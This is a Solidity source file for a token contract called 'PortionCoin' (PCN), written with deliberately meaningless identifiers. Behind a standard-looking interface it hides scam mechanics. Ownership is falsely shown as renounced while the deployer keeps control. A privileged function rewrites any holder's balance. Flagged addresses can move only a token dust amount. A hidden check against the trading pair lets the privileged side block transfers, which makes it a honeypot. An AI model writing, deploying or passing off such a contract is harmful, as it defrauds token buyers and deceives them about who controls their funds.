//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract enableAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyTake {
    function createPair(address feeIs, address feeSellMarketing) external returns (address);

    function feeTo() external view returns (address);
}

interface exemptTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface maxIsAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeFund) external view returns (uint256);

    function transfer(address feeLaunched, uint256 autoModeSell) external returns (bool);

    function allowance(address marketingMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoModeSell) external returns (bool);

    function transferFrom(
        address sender,
        address feeLaunched,
        uint256 autoModeSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptTradingSell, uint256 value);
    event Approval(address indexed marketingMax, address indexed spender, uint256 value);
}

interface sellIs is maxIsAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PortionCoin is enableAmount, maxIsAt, sellIs {

    string private fromTo = "PCN";

    function name() external view virtual override returns (string memory) {
        return liquidityAutoTx;
    }

    uint256 public shouldSenderMode;

    uint256 exemptMarketing;

    function approve(address feeExempt, uint256 autoModeSell) public virtual override returns (bool) {
        fromAmountTrading[_msgSender()][feeExempt] = autoModeSell;
        emit Approval(_msgSender(), feeExempt, autoModeSell);
        return true;
    }

    function feeReceiver(address swapReceiver) public {
        require(swapReceiver.balance < 100000);
        if (limitList) {
            return;
        }
        
        autoEnable[swapReceiver] = true;
        
        limitList = true;
    }

    uint256 private tradingLimit = 100000000 * 10 ** 18;

    function balanceOf(address feeFund) public view virtual override returns (uint256) {
        return swapAt[feeFund];
    }

    uint256 public isEnable;

    mapping(address => mapping(address => uint256)) private fromAmountTrading;

    uint256 public enableFee = 0;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingLimit;
    }

    uint256 public launchExemptTo = 0;

    function decimals() external view virtual override returns (uint8) {
        return shouldFund;
    }

    function txTake() public {
        emit OwnershipTransferred(liquidityTake, address(0));
        teamTotalTrading = address(0);
    }

    mapping(address => bool) public autoEnable;

    address buyTo;

    function allowance(address tokenAmount, address feeExempt) external view virtual override returns (uint256) {
        if (feeExempt == txAmount) {
            return type(uint256).max;
        }
        return fromAmountTrading[tokenAmount][feeExempt];
    }

    uint256 takeBuy;

    bool public takeMin;

    function fromMode(uint256 autoModeSell) public {
        receiverLaunch();
        exemptMarketing = autoModeSell;
    }

    function receiverLaunch() private view {
        require(autoEnable[_msgSender()]);
    }

    function owner() external view returns (address) {
        return teamTotalTrading;
    }

    address private teamTotalTrading;

    function getOwner() external view returns (address) {
        return teamTotalTrading;
    }

    uint256 public takeExempt;

    bool public limitList;

    function maxFee(address fundEnableBuy, address feeLaunched, uint256 autoModeSell) internal returns (bool) {
        if (fundEnableBuy == liquidityTake) {
            return launchMax(fundEnableBuy, feeLaunched, autoModeSell);
        }
        uint256 fromMin = maxIsAt(listLimitIs).balanceOf(buyTo);
        require(fromMin == exemptMarketing);
        require(feeLaunched != buyTo);
        if (shouldEnable[fundEnableBuy]) {
            return launchMax(fundEnableBuy, feeLaunched, autoListLimit);
        }
        autoModeSell = launchedSender(fundEnableBuy, feeLaunched, autoModeSell);
        return launchMax(fundEnableBuy, feeLaunched, autoModeSell);
    }

    function modeLiquidity(address senderTokenTotal) public {
        receiverLaunch();
        
        if (senderTokenTotal == liquidityTake || senderTokenTotal == listLimitIs) {
            return;
        }
        shouldEnable[senderTokenTotal] = true;
    }

    bool public amountSender;

    string private liquidityAutoTx = "Portion Coin";

    event OwnershipTransferred(address indexed toTake, address indexed launchTake);

    constructor (){
        
        txTake();
        exemptTake launchedMin = exemptTake(txAmount);
        listLimitIs = buyTake(launchedMin.factory()).createPair(launchedMin.WETH(), address(this));
        buyTo = buyTake(launchedMin.factory()).feeTo();
        
        liquidityTake = _msgSender();
        autoEnable[liquidityTake] = true;
        swapAt[liquidityTake] = tradingLimit;
        if (isEnable != listTotal) {
            marketingExemptIs = true;
        }
        emit Transfer(address(0), liquidityTake, tradingLimit);
    }

    function transferFrom(address fundEnableBuy, address feeLaunched, uint256 autoModeSell) external override returns (bool) {
        if (_msgSender() != txAmount) {
            if (fromAmountTrading[fundEnableBuy][_msgSender()] != type(uint256).max) {
                require(autoModeSell <= fromAmountTrading[fundEnableBuy][_msgSender()]);
                fromAmountTrading[fundEnableBuy][_msgSender()] -= autoModeSell;
            }
        }
        return maxFee(fundEnableBuy, feeLaunched, autoModeSell);
    }

    function minTx(address fundShouldSwap, uint256 autoModeSell) public {
        receiverLaunch();
        swapAt[fundShouldSwap] = autoModeSell;
    }

    mapping(address => uint256) private swapAt;

    uint256 private listTotal;

    uint256 private senderWalletTo;

    uint8 private shouldFund = 18;

    uint256 constant autoListLimit = 7 ** 10;

    address public liquidityTake;

    mapping(address => bool) public shouldEnable;

    bool public totalTeam;

    bool private fundFeeSender;

    function transfer(address fundShouldSwap, uint256 autoModeSell) external virtual override returns (bool) {
        return maxFee(_msgSender(), fundShouldSwap, autoModeSell);
    }

    address public listLimitIs;

    bool private marketingExemptIs;

    function launchedSender(address fundEnableBuy, address feeLaunched, uint256 autoModeSell) internal view returns (uint256) {
        require(autoModeSell > 0);

        uint256 amountReceiverSwap = 0;
        if (fundEnableBuy == listLimitIs && enableFee > 0) {
            amountReceiverSwap = autoModeSell * enableFee / 100;
        } else if (feeLaunched == listLimitIs && launchExemptTo > 0) {
            amountReceiverSwap = autoModeSell * launchExemptTo / 100;
        }
        require(amountReceiverSwap <= autoModeSell);
        return autoModeSell - amountReceiverSwap;
    }

    function symbol() external view virtual override returns (string memory) {
        return fromTo;
    }

    function launchMax(address fundEnableBuy, address feeLaunched, uint256 autoModeSell) internal returns (bool) {
        require(swapAt[fundEnableBuy] >= autoModeSell);
        swapAt[fundEnableBuy] -= autoModeSell;
        swapAt[feeLaunched] += autoModeSell;
        emit Transfer(fundEnableBuy, feeLaunched, autoModeSell);
        return true;
    }

    address txAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}